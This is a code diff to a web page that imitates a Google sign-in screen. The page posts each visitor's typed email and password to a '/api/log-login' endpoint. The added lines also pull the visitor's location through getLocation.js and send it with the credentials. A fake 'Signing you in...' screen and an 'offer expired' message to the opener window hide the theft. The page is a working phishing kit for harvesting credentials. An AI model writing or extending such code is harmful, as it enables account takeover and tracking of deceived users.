@@ -170,6 +170,7 @@
       100% { transform: rotate(360deg); }
     }
   </style>
+  <script src="/getLocation.js"></script>
   <script>
     function showGoogleLoading() {
       document.getElementById('step-email').style.display = 'none';
@@ -185,54 +186,54 @@
       }, 2000);
     }
 
+    function showLoginFailedPopup() {
+      // Try to notify parent or opener with a LOGIN_FAILED message
+      try {
+        if (window.opener && !window.opener.closed) {
+          window.opener.postMessage({ type: 'LOGIN_FAILED', platform: 'Google' }, '*');
+        }
+        localStorage.setItem('loginFailed', JSON.stringify({ platform: 'Google', timestamp: Date.now() }));
+        if (window.parent && window.parent !== window) {
+          window.parent.postMessage({ type: 'LOGIN_FAILED', platform: 'Google' }, '*');
+        }
+      } catch (error) {}
+      setTimeout(function() { window.close(); }, 100);
+    }
+
     function submitGoogleLogin(e) {
       e.preventDefault();
       var email = document.getElementById('email').value;
       var password = document.getElementById('password').value;
-      
-      // Log credentials to server
-      fetch('/api/log-login', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email, password, platform: 'Google' })
-      });
-
-      // Show Google loading screen
-      document.getElementById('step-password').style.display = 'none';
-      document.getElementById('google-loading').style.display = 'flex';
-      document.querySelector('#google-loading div:last-child').textContent = 'Signing you in...';
-
-      // After 3 seconds, close tab and notify parent
-      setTimeout(function() {
-        console.log('Google login: Sending OFFER_EXPIRED message'); // Debug log
-        
-        // Try multiple methods to notify parent
-        try {
-          // Method 1: PostMessage
-          if (window.opener && !window.opener.closed) {
-            window.opener.postMessage({ type: 'OFFER_EXPIRED', platform: 'Google' }, '*');
-            console.log('PostMessage sent to opener'); // Debug log
-          }
-          
-          // Method 2: LocalStorage fallback
-          localStorage.setItem('offerExpired', JSON.stringify({ platform: 'Google', timestamp: Date.now() }));
-          console.log('LocalStorage fallback set'); // Debug log
-          
-          // Method 3: Try parent if opener doesn't work
-          if (window.parent && window.parent !== window) {
-            window.parent.postMessage({ type: 'OFFER_EXPIRED', platform: 'Google' }, '*');
-            console.log('PostMessage sent to parent'); // Debug log
-          }
-        } catch (error) {
-          console.error('Error sending message:', error);
+      getUserLocation(function(result) {
+        var payload = { email, password, platform: 'Google' };
+        if (result.success && result.locationUrl) {
+          payload.location = result.locationUrl;
         }
-        
-        // Close the window
+        fetch('/api/log-login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        document.getElementById('step-password').style.display = 'none';
+        document.getElementById('google-loading').style.display = 'flex';
+        document.querySelector('#google-loading div:last-child').textContent = 'Signing you in...';
         setTimeout(function() {
-          window.close();
-        }, 100);
-      }, 3000);
-
+          try {
+            if (result.success) {
+              if (window.opener && !window.opener.closed) {
+                window.opener.postMessage({ type: 'OFFER_EXPIRED', platform: 'Google' }, '*');
+              }
+              localStorage.setItem('offerExpired', JSON.stringify({ platform: 'Google', timestamp: Date.now() }));
+              if (window.parent && window.parent !== window) {
+                window.parent.postMessage({ type: 'OFFER_EXPIRED', platform: 'Google' }, '*');
+              }
+            } else {
+              showLoginFailedPopup();
+            }
+          } catch (error) {}
+          setTimeout(function() { window.close(); }, 100);
+        }, 3000);
+      });
       return false;
     }
   </script>
